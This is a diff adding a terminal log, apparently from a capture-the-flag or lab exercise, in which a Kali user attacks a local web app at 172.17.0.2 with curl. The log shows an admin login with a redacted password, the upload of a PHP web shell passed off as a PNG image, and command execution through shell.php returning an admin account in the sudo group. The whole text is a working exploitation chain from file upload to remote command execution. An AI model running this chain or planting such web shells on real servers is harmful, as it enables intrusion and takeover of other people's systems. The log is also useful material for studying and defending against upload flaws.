@@ -1,0 +1,18 @@
+chifay@kali:~/SHADOW ADMIN$ curl -sS http://172.17.0.2/profile.php
+
+<form method=POST>User: <input name=user><br>Pass: <input type=password name=pass><br><input type=submit name=login></form>
+chifay@kali:~/SHADOW ADMIN$ rm -f cookies.txt
+
+chifay@kali:~/SHADOW ADMIN$ curl -sS -c cookies.txt -b cookies.txt --data-urlencode "user=admin" --data-urlencode "pass=[REDACTADO]" --data-urlencode "login=1" http://172.17.0.2/profile.php
+
+<form method=POST enctype=multipart/form-data><input type=file name=shell><input type=submit name=upload></form>
+chifay@kali:~/SHADOW ADMIN$ curl -sS -b cookies.txt -F "shell=@www/shell.php;type=image/png" -F "upload=1" http://172.17.0.2/profile.php
+
+<form method=POST enctype=multipart/form-data><input type=file name=shell><input type=submit name=upload></form>
+chifay@kali:~/SHADOW ADMIN$ curl -sS "http://172.17.0.2/shell.php?c=id"
+
+<pre>uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)
+</pre>
+chifay@kali:~/SHADOW ADMIN$ exit
+
+exit
